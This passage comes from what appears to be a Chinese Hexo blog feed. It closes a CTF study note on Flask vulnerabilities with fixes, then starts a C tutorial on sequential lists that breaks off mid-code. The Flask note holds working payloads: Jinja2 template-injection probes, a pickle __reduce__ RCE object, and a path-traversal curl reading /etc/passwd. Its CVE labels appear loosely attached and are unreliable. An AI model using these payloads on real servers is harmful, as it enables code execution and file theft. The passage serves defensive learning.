class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>这会返回 <code>49</code>，说明模板表达式已经被成功执行。</p><h4 id="更严重的攻击："><a href="#更严重的攻击：" class="headerlink" title="更严重的攻击："></a>更严重的攻击：</h4><p>攻击者可以利用模板注入执行任意 Python 代码。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;config.items()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li><code>render_template_string()</code> 不安全地直接渲染了用户提供的字符串。</li><li>攻击者可以构造恶意的模板代码，借助 Jinja2 的模板表达式执行 Python 代码。</li></ol><p><strong>解决方法</strong>：</p><ol><li>避免直接使用 <code>render_template_string</code> 渲染用户输入的数据。</li><li>如果必须使用动态渲染，使用严格的过滤或使用 <code>StrictUndefined</code> 模式：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, StrictUndefined<br><br>env = Environment(undefined=StrictUndefined)<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2018-1000656-Flask-反序列化漏洞"><a href="#CVE-2018-1000656-Flask-反序列化漏洞" class="headerlink" title="CVE-2018-1000656 - Flask 反序列化漏洞"></a>CVE-2018-1000656 - Flask 反序列化漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2018-1000656</strong> 是 Flask 应用中的反序列化漏洞。反序列化漏洞通常发生在不安全地反序列化用户输入的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Flask 应用通过 <code>pickle</code> 或类似的反序列化机制加载用户输入的数据时，攻击者可以构造恶意序列化数据，使得应用执行任意代码。</p><h4 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    serialized_data = request.data<br>    data = pickle.loads(serialized_data)<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的序列化数据，发送到服务器端，导致远程代码执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls&#x27;</span>,))<br><br>payload = pickle.dumps(RCE())<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><p>通过 POST 请求发送恶意数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data-binary <span class="hljs-string">&quot;@payload.pickle&quot;</span> http://localhost:5000/load_data<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ol><li><code>pickle.loads</code> 直接反序列化用户提供的数据，攻击者可以构造恶意序列化对象。</li><li><code>__reduce__</code> 方法被用来指定如何反序列化对象，从而执行恶意代码（如 <code>os.system(&#39;ls&#39;)</code>）。</li></ol><p><strong>解决方法</strong>：</p><ol><li>避免使用 <code>pickle</code> 反序列化不受信任的用户数据。</li><li>如果需要序列化数据，建议使用安全的序列化格式，如 <code>JSON</code>。</li></ol><hr><h2 id="CVE-2019-1010085-Flask-文件上传路径遍历漏洞"><a href="#CVE-2019-1010085-Flask-文件上传路径遍历漏洞" class="headerlink" title="CVE-2019-1010085 - Flask 文件上传路径遍历漏洞"></a>CVE-2019-1010085 - Flask 文件上传路径遍历漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010085</strong> 是 Flask 文件上传功能中的路径遍历漏洞。攻击者通过构造恶意文件名，可以访问服务器上的敏感文件，甚至执行文件覆盖等攻击。</p><h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过上传文件时构造恶意路径，利用路径遍历漏洞访问服务器上的任意文件，甚至可能覆盖关键文件。</p><h4 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, send_from_directory<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过文件名参数构造路径遍历攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><p>此攻击将读取服务器上的 <code>/etc/passwd</code> 文件内容。</p><p><strong>解释</strong>：</p><ol><li><code>send_from_directory(&#39;/uploads&#39;, filename)</code> 函数中没有验证 <code>filename</code> 参数，攻击者可以构造路径遍历（如 <code>../../</code>）来读取任意文件。</li><li>通过 <code>..</code> 来跳出 <code>/uploads</code> 目录，访问系统文件。</li></ol><p><strong>解决方法</strong>：<br>使用 <code>os.path.join</code> 或 <code>safe_join</code> 来确保文件路径在指定目录内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename, safe_join<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    safe_filename = secure_filename(filename)<br>    safe_path = safe_join(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_filename)<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_path)<br></code></pre></td></tr></table></figure><ul><li><code>secure_filename</code> 将文件名安全化，移除特殊字符和危险路径。</li><li><code>safe_join</code> 确保路径在 <code>/uploads</code> 目录下，防止路径遍历攻击。</li></ul><hr><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li><p><strong>SQL 注入</strong>：Flask 中的 SQL 注入攻击通常发生在未使用参数化查询的地方。攻击者可以通过注入恶意的 SQL 语句，查询、修改甚至删除数据库中的数据。防御措施是使用 ORM 工具，如 SQLAlchemy，避免直接拼接 SQL 字符串。</p></li><li><p>**远程代码执行 (RCE)**：Flask 使用 <code>render_template_string</code> 时，容易受到模板注入攻击。攻击者通过注入恶意模板表达式可以执行任意代码。防御措施是避免渲染用户输入的模板，使用严格的模板渲染模式。</p></li><li><p><strong>反序列化漏洞</strong>：当 Flask 使用 <code>pickle</code> 等反序列化库时，容易受到反序列化攻击。攻击者可以构造恶意序列化数据，导致任意代码执行。防御措施是避免使用不安全的序列化方法，推荐使用 JSON 作为序列化方式。</p></li><li><p><strong>路径遍历漏洞</strong>：Flask 中的路径遍历攻击发生在处理文件路径时，攻击者可以通过构造恶意的文件路径访问服务器上的任意文件。防御措施是确保文件</p></li></ol><p>路径的合法性，使用 <code>secure_filename</code> 和 <code>safe_join</code> 函数来防止路径遍历。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>基础笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfweb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c语言的数据结构</title>
    <link href="/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="c语言的数据结构"><a href="#c语言的数据结构" class="headerlink" title="c语言的数据结构"></a>c语言的数据结构</h1><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>顺序表是一种线性表，其元素在内存中连续存放，可以通过数组来实现。</p><p>顺序表是一种顺序存储的线性表，其特点如下：</p><ol><li><p><strong>数组下标与元素位置的关系：</strong></p><ul><li>数组下标从0开始，每个元素的索引与其在数组中的物理位置相对应。</li></ul></li><li><p><strong>内存地址的计算公式：</strong></p><ul><li>对于一个长度为n的顺序表A，其中第i个元素（假设类型为ElemType）的内存地址可以通过以下公式计算得出：<br>[LOC(A[i]) &#x3D; LOC(A[0]) + sizeof(ElemType) * i]<br>其中：</li><li>(LOC(A[0])) 是第一个元素（即数组下标为0的元素）的内存地址。</li><li>(sizeof(ElemType)) 表示元素类型的字节大小。</li><li>(i) 是当前元素的数组下标。</li></ul></li><li><p><strong>示例分析：</strong></p><ul><li>假设有一个整型数组A，其起始地址为1000，且每个整数占用4个字节的空间。</li><li>则第二个元素（即数组下标为1的元素）的内存地址可以计算为：<br>[LOC(A[1]) &#x3D; 1000 + 4 * 1 &#x3D; 1004]<br>通过上述结构，我们可以方便地访问顺序表中任意位置的元素，只需知道数组的起始地址、元素类型以及目标元素的索引即可。</li></ul></li><li><p>关于c语言的基础：</p><ol><li><p><strong>传入指针（例如 <code>SeqList *list</code>）</strong></p><ul><li>当你传入 <code>SeqList *list</code> 时，表示你传递的是一个指针（也就是 <code>list</code> 的地址）。</li><li>传递指针的好处是你可以直接在函数内部修改指针指向的内存中的内容。</li><li>举个例子，在 <code>InitList()</code> 函数中，你传入了 <code>SeqList *list</code>，因为你需要修改 <code>list-&gt;length</code> 的值，而不是修改一个副本。</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">void</span> InitList(SeqList *list) &#123;<br>    list-&gt;<span class="hljs-built_in">length</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 直接修改指针指向的结构体的成员</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>传入结构体（例如 <code>SeqList list</code>）</strong></p><ul><li>如果你传入的是 <code>SeqList list</code>，那么传递的是整个结构体的副本。</li><li>在这种情况下，函数内对 <code>list</code> 的任何修改都不会影响到原始的结构体，因为函数只是对 <code>list</code> 进行了值传递，原来的数据并没有被改变。</li><li>例如，如果你用下面的方式传递 <code>list</code>：</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">void</span> InitList(SeqList list) &#123;<br>    list.<span class="hljs-built_in">length</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 只是修改了副本，不会影响到原始的顺序表</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="3-使用示例对比"><a href="#3-使用示例对比" class="headerlink" title="3. 使用示例对比"></a>3. 使用示例对比</h3><p>假设你有一个顺序表，并希望使用一个函数初始化它：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">SeqList list;<br><span class="hljs-built_in">InitList</span>(&amp;list); <span class="hljs-comment">// 传递指针，这样函数可以修改原始 list 的内容</span><br></code></pre></td></tr></table></figure><p>在 <code>InitList()</code> 函数中，传入的是 <code>&amp;list</code>，这是 <code>list</code> 的地址，所以 <code>InitList()</code> 函数接收的是一个指向 <code>SeqList</code> 的指针（<code>SeqList *list</code>）。</p><ul><li>在函数内部，<code>list</code> 是一个指针，指向了原始的 <code>SeqList</code> 变量。</li><li>使用 <code>list-&gt;length</code> 可以直接修改原始顺序表中的 <code>length</code> 值。</li></ul><p>而如果你传递 <code>SeqList list</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">SeqList list;<br><span class="hljs-built_in">InitList</span>(list); <span class="hljs-comment">// 传递的是结构体的副本</span><br></code></pre></td></tr></table></figure><p>这样 <code>InitList()</code> 函数接收的是 <code>SeqList list</code>，它只是原始数据的副本，任何修改都不会影响原始的 <code>list</code>。</p><h3 id="4-为什么要传递指针？"><a href="#4-为什么要传递指针？" class="headerlink" title="4. 为什么要传递指针？"></a>4. 为什么要传递指针？</h3><p>传递指针的主要原因有以下几点：</p><ol><li><strong>修改原始数据</strong>：通过传递指针，你可以在函数内部修改原始数据，而不仅仅是修改副本。</li><li><strong>提高效率</strong>：传递一个指针比传递整个结构体更加高效，特别是当结构体较大时，传递副本会浪费大量的内存和时间。</li></ol></li></ol><p>代码的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100  <span class="hljs-comment">// 定义顺序表的最大容量</span></span><br><br><span class="hljs-comment">// 顺序表结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// 用于存储元素的数组</span><br>    <span class="hljs-type">int</span> length;         <span class="hljs-comment">// 顺序表的当前长度</span><br>&#125; SeqList;<br><span class="hljs-comment">// 初始化顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InitList</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-built_in">list</span>-&gt;length = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 打印顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(SeqList <span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>.length; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, <span class="hljs-built_in">list</span>.data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 在顺序表中插入元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">1</span> || pos &gt; <span class="hljs-built_in">list</span>-&gt;length + <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入位置不合法\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 插入位置不合法</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>-&gt;length &gt;= MAX_SIZE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;顺序表已满，无法插入\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 顺序表已满</span><br>    &#125;<br>    <span class="hljs-comment">// 从最后一个元素开始，向后移动数据</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-built_in">list</span>-&gt;length; i &gt;= pos; i--) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i] = <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;data[pos - <span class="hljs-number">1</span>] = value; <span class="hljs-comment">// 插入元素</span><br>    <span class="hljs-built_in">list</span>-&gt;length++;              <span class="hljs-comment">// 表长度增加</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// 删除顺序表中的元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> pos)</span> &#123;<br>    <span class="hljs-keyword">if</span> (pos &lt; <span class="hljs-number">1</span> || pos &gt; <span class="hljs-built_in">list</span>-&gt;length) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除位置不合法\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 删除位置不合法</span><br>    &#125;<br>    <span class="hljs-comment">// 从删除位置开始，向前移动数据</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = pos; i &lt; <span class="hljs-built_in">list</span>-&gt;length; i++) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data[i - <span class="hljs-number">1</span>] = <span class="hljs-built_in">list</span>-&gt;data[i];<br>    &#125;<br>    <span class="hljs-built_in">list</span>-&gt;length--; <span class="hljs-comment">// 表长度减少</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// 查找顺序表中的元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Find</span><span class="hljs-params">(SeqList <span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">list</span>.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span>.data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>; <span class="hljs-comment">// 返回元素的位置（从1开始）</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 未找到</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SeqList <span class="hljs-built_in">list</span>;<br>    <span class="hljs-comment">// 初始化顺序表</span><br>    InitList(&amp;<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// 插入元素</span><br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">20</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>, <span class="hljs-number">30</span>);<br>    Insert(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>);<br>    <span class="hljs-comment">// 打印顺序表</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;顺序表的内容为：&quot;</span>);<br>    PrintList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-comment">// 查找元素</span><br>    <span class="hljs-type">int</span> pos = Find(<span class="hljs-built_in">list</span>, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">if</span> (pos != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;元素20的位置是：%d\n&quot;</span>, pos);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未找到元素20\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 删除元素</span><br>    Delete(&amp;<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-comment">// 打印顺序表</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除元素后的顺序表为：&quot;</span>);<br>    PrintList(<span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//这里是运用动态分配写的代码</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// 定义顺序表结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> *data;    <span class="hljs-comment">// 指向动态分配的数组</span><br>    <span class="hljs-type">int</span> size;     <span class="hljs-comment">// 当前顺序表的大小</span><br>    <span class="hljs-type">int</span> capacity; <span class="hljs-comment">// 顺序表的容量</span><br>&#125; SeqList;<br><span class="hljs-comment">// 初始化顺序表</span><br>SeqList* <span class="hljs-title function_">initSeqList</span><span class="hljs-params">(<span class="hljs-type">int</span> initialCapacity)</span> &#123;<br>    SeqList *<span class="hljs-built_in">list</span> = (SeqList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SeqList));<br>    <span class="hljs-built_in">list</span>-&gt;data = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(initialCapacity * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-built_in">list</span>-&gt;size = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">list</span>-&gt;capacity = initialCapacity;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>;<br>&#125;<br><span class="hljs-comment">// 扩展顺序表容量</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">expandCapacity</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>)</span> &#123;<br>    <span class="hljs-type">int</span> newCapacity = <span class="hljs-built_in">list</span>-&gt;capacity * <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> *newData = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">realloc</span>(<span class="hljs-built_in">list</span>-&gt;data, newCapacity * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span> (newData != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">list</span>-&gt;data = newData;<br>        <span class="hljs-built_in">list</span>-&gt;capacity = newCapacity;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;内存分配失败！\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 插入元素到顺序表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertElement</span><span class="hljs-params">(SeqList *<span class="hljs-built_in">list</span>, <span class="hljs-type">int</span> position, <span class="hljs-type">int</span> value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (position &lt; <span class="hljs-number">0</span> || position &gt; <span class="hljs-built_in">list</span>-&gt;size) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入位置不合法！\n&quot;</span>);<br>        <span 